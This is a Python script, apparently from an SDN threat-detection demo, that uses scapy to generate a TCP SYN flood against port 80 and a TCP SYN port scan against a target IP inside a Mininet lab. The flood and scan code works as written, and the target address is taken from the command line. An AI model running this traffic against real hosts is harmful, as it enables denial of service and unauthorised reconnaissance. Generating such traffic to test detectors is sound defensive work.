#!/usr/bin/env python3
"""Generate attack traffic inside a Mininet host namespace.

Usage (from the Mininet CLI):
    mininet> hacker python3 src/scripts/simulate_attack.py syn-flood 10.0.3.10
    mininet> hacker python3 src/scripts/simulate_attack.py port-scan 10.0.3.10
"""

from __future__ import annotations

import argparse
import random
import sys
import time

from scapy.all import IP, TCP, send  # type: ignore[import-untyped]

DEFAULT_SYN_FLOOD_DURATION = 30
DEFAULT_SYN_FLOOD_PPS = 200
DEFAULT_SCAN_PORT_START = 1
DEFAULT_SCAN_PORT_END = 1024


def syn_flood(
    target: str,
    *,
    duration_s: int = DEFAULT_SYN_FLOOD_DURATION,
    pps: int = DEFAULT_SYN_FLOOD_PPS,
) -> None:
    """Send a burst of TCP SYN packets to *target*:80.

    Args:
        target: Destination IPv4 address.
        duration_s: How long to sustain the flood in seconds.
        pps: Packets per second.
    """
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration_s
    sent = 0

    print(f"[syn-flood] target={target} duration={duration_s}s pps={pps}")

    while time.monotonic() < end_time:
        pkt = IP(dst=target) / TCP(
            sport=random.randint(1024, 65535),  # noqa: S311
            dport=80,
            flags="S",
        )
        send(pkt, verbose=False)
        sent += 1
        time.sleep(interval)

    print(f"[syn-flood] done — {sent} packets sent")


def port_scan(
    target: str,
    *,
    start_port: int = DEFAULT_SCAN_PORT_START,
    end_port: int = DEFAULT_SCAN_PORT_END,
) -> None:
    """Send one TCP SYN per port in [start_port, end_port] to *target*.

    Args:
        target: Destination IPv4 address.
        start_port: First port in the scan range.
        end_port: Last port in the scan range (inclusive).
    """
    if start_port <= 0 or end_port <= 0:
        msg = "Port numbers must be greater than 0"
        raise ValueError(msg)

    if end_port > 65535:
        msg = "Port numbers must be less than 65536"
        raise ValueError(msg)

    if start_port > end_port:
        msg = "Start port must be less than end port"
        raise ValueError(msg)

    print(f"[port-scan] target={target} ports={start_port}..={end_port}")

    for port in range(start_port, end_port + 1):
        pkt = IP(dst=target) / TCP(
            sport=random.randint(1024, 65535),  # noqa: S311
            dport=port,
            flags="S",
        )
        send(pkt, verbose=False)
        time.sleep(0.01)

    total = end_port - start_port + 1
    print(f"[port-scan] done — {total} ports scanned")


def _build_parser() -> argparse.ArgumentParser:
    top = argparse.ArgumentParser(
        description="Generate attack traffic for SDN threat detection demo."
    )
    sub = top.add_subparsers(dest="command", required=True)

    flood = sub.add_parser("syn-flood", help="TCP SYN flood attack")
    flood.add_argument("target", help="Target IPv4 address")
    flood.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_SYN_FLOOD_DURATION,
        help="Flood duration in seconds (default: %(default)s)",
    )
    flood.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_SYN_FLOOD_PPS,
        help="Packets per second (default: %(default)s)",
    )

    scan = sub.add_parser("port-scan", help="TCP SYN port scan")
    scan.add_argument("target", help="Target IPv4 address")
    scan.add_argument(
        "-s",
        "--start-port",
        type=int,
        default=DEFAULT_SCAN_PORT_START,
        help="First port to scan (default: %(default)s)",
    )
    scan.add_argument(
        "-e",
        "--end-port",
        type=int,
        default=DEFAULT_SCAN_PORT_END,
        help="Last port to scan (default: %(default)s)",
    )

    return top


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()

    if args.command == "syn-flood":
        syn_flood(args.target, duration_s=args.duration, pps=args.pps)
    elif args.command == "port-scan":
        port_scan(
            args.target,
            start_port=args.start_port,
            end_port=args.end_port,
        )
    else:
        print(f"Unknown command: {args.command}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
